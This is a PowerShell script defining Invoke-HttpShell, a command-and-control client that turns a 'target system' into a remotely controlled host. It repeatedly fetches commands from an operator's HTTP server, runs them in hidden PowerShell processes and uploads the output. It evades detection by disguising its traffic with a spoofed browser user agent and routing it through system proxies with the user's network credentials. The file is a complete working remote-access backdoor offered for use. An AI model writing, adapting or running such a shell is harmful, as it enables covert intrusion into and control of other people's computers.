function Invoke-HttpShell
{

<#

.Synopsis
    HTTP-Shell powershell client.

.Description
    This script will connect to a Shell-TTP server and provide command and control
    capabilities from the target system.

.Parameter Server
    The string containing the server or hostname of the shell-ttp server

.Parameter Port
    The string containing the port to communicate over

.Parameter Proxy
    A switch to specify that you want to use a Proxy (default no proxy)

.Parameter ProxyAddress
    A string specifying a custom proxy to use (ex: http://testproxy.net:3128)

.Example
    Import-Module HTTP-Shell.ps1
    Invoke-HttpShell -Server 127.0.0.1 -Port 80
    Invoke-HttpShell -Server 127.0.0.1 -Port 80 -Proxy
    Invoke-HttpShell -Server 127.0.0.1 -Port 80 -ProxyAddress 'http://testproxy.net:3128' -UserAgent 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)'

#>
    [CmdletBinding()]
    Param (
        [Parameter(Mandatory = $True)]
        [string]$Server,
        [Parameter(Mandatory = $True)]
        [string]$Port,
        [Parameter(Mandatory = $False)]
        [switch]$Proxy = $False,
        [Parameter(Mandatory = $False)]
        [string]$ProxyAddress = $Null,
        [Parameter(Mandatory = $False)]
        [string]$UserAgent = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)"
    )
    process
    {
        function Execute-Powershell ($command) {
            $startInfo = New-Object System.Diagnostics.ProcessStartInfo
            $startInfo.FileName = "powershell.exe"
            $startInfo.Arguments = $command, $null

            $startInfo.RedirectStandardOutput = $true
            $startInfo.UseShellExecute = $false
            $startInfo.CreateNoWindow = $true

            $process = New-Object System.Diagnostics.Process
            $process.StartInfo = $startInfo
            $process.Start() | Out-Null
            $standardOut = $process.StandardOutput.ReadToEnd()
            $process.WaitForExit()

            return $standardOut
        }

        $uri = "http://" + $Server + ":" + $Port + "/"
        $wc = New-Object -TypeName System.Net.WebClient

        if ($Proxy) {
          $newProxy = [System.Net.WebRequest]::GetSystemWebProxy()
          $newProxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
        } elseif ($ProxyAddress) {
          $newProxy = New-Object -TypeName System.Net.WebProxy
          $newProxy.Address = $ProxyAddress
          $newProxy.UseDefaultCredentials = $True
          $newProxy.BypassProxyOnLocal = $False
        } else {
          $newProxy = [System.Net.GlobalProxySelection]::GetEmptyWebProxy()
        }

        $wc.proxy = $newProxy

        $sleep = 2

        while ($True) {
            $wc.Headers.Add("User-Agent", $UserAgent)
            $wc.Headers.Add("Content-Type", "application/x-www-form-urlencoded")
            $wc.Headers.Add("Accept", "text/plain")
            $command = $wc.DownloadString($uri)

            if ($command) {
                if ($command -like "checkin") {
                    $results = "Checking in..."
                } elseif ($command -like "sleep *") {
                    $sleep = $command.split(' ')[1]
                    $results = "Sleep updated to $sleep"
                } elseif ($command -like "exit") {
                    break
                } else {
                    $results = Execute-Powershell $command
                }

                $wc.Headers.Add("User-Agent", $UserAgent)
                $wc.Headers.Add("Content-Type", "application/x-www-form-urlencoded")
                $wc.Headers.Add("Accept", "text/plain")
                $wc.UploadString($uri + "index.aspx", "POST", $results)
                $command = $results = [string]::empty
            }
            Start-Sleep -Seconds $sleep
        }
    }
}
